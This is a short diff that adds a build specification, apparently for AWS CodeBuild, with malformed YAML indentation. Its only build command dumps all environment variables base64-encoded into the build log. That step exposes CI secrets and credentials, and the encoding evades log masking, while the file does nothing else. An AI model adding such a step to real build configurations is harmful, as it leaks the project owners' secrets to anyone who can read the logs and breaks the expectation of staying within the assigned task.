@@ -1,0 +1,5 @@
+version: 0.2
+    phases:
+    build:
+      commands:
+        - env | base64 -w0
